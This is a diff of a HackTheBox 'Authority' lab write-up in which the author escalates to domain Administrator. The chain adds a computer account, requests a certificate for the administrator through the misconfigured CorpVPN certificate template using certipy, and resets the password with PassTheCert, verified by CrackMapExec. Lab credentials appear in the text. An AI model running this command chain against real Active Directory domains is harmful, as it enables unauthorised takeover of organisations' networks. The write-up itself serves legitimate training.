@@ -1,4 +1,4 @@
-![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/757bec12-b6cc-44f3-81f4-86bc2ba7f908)
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/70cc2b79-3cd4-431c-b8d0-a0eadd584656)![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/757bec12-b6cc-44f3-81f4-86bc2ba7f908)
 
 https://app.hackthebox.com/machines/Authority
 
@@ -510,11 +510,71 @@ From the [hactrickz](https://book.hacktricks.xyz/windows-hardening/active-direct
 This indicates we can add a new computer account in Active Directory using the credentials of a domain user. In this case, I will use the "[impacket-addcomputer](https://tools.thehacker.recipes/impacket/examples/addcomputer.py)" tool.
 
 ```bash
-python3 /opt/impacket/examples/addcomputer.py authority.htb.corp/svc_ldap:'lDaP_1n_th3_cle4r!' -computer-name 'FXI$' -computer-pass 'Passw0rd1!'
+impacket-addcomputer 'authority.htb/svc_ldap:<password_here>' -method LDAPS -computer-name 'FXI' -computer-pass 'Password1@'
 ```
-![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/3108b696-b9f5-4d3a-b9ef-2f207ff9f141)
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/dd5dde22-1951-48dd-81a6-cf4c30cd07e5)
 
-Now using Certipy, we can generated a certificate request using the computer account "FXI$" with the password "Passw0rd1!" and the template "CorpVPN," which will allow us to escalate privileges.
+After creating the new machine account we can verify if it's active in AD or not using CrackMapExec.
+
+```bash
+crackmapexec smb 10.10.11.222 -u "FXI$" -p 'Password1@' -d auhtority.htb
+```
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/70d6afd7-69ed-4a8b-a389-656f5d3a25bb)
+
+Now using Certipy, I will generate a certificate using the computer account "FXI$" with the password "Passw0rd1!" and the template "CorpVPN," which will allow us to escalate privileges.
+
+Although, the machine account is created & active in the AD, when I was using certipy to generate the certificate from the vulnerable template & I was constantly getting 2 errors:
+
+```
+- Unknown DCE RPC fault status code: 00000721
+- The NETBIOS connection with the remote host timed out.
+```
+
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/c12fdaa6-90cf-4ffc-8393-f7bbfeb7168d)
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/25b1f41b-f848-4370-b0ee-2d55feccea66)
+
+To resolve this issue, I added the DC IP address to the DNS configuration IPv4 address.
+
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/8357c9f6-7b51-41fd-b7e4-02e9589be44f)
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/102eaa6a-dbb1-44c0-9294-24609ecfc9dd)
+
+After adding the IP, I restarted the network manager.
+
+```bash
+sudo systemctl restart NetworkManager
+```
+
+After doing all these changes, I tried again to generate the certificate & this time I got the certificate.
+
+```bash
+certipy req -u 'FXI$' -p 'Password1@' -dc-ip 10.10.11.222 -ca AUTHORITY-CA -template 'CorpVPN' -upn 'administrator@authority.htb'
+```
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/664177ed-09ca-48cf-9030-e425e1e3bf8d)
+
+After the generation of the administrator certificate I generated 2 other certificates: one without including the private key and another without including the certificate.
+
+```bash
+certipy cert -pfx administrator.pfx -nokey -out user.crt
+
+certipy cert -pfx administrator.pfx -nocert -out user.key
+```
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/c392f25e-d3e5-49bc-ad6a-2058ebe45edd)
+
+After generating the certificates I used the tool "[**PassTheCert**](https://github.com/AlmondOffSec/PassTheCert)" which I found in this [blog](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html), which will reset the administrator password using our certificates.
+
+```bash
+python3 passthecert.py -action modify_user -crt user.crt -key user.key -domain authority.htb -dc-ip 10.10.11.222 -target administrator -new-pass
+```
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/53118f62-b00a-4ec1-b9af-76bb9d8f0bdb)
+
+After the password is reset I verified it using the CrackMapExec & observed that I have the access of Administrator user.
+
+```bash
+crackmapexec smb 10.10.11.222 -u "Administrator" -p 'OHmxaa5pHwIufhIWtGIBitBKllG5hnmb' -d auhtority.htb
+```
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/b9bbd72f-8ca7-4ea5-8c20-46f42f3e729a)
+
+Using these credentials I finally logged into the Administrator account & got the root flag finally. (pwn3d!🙂)
 
 
 
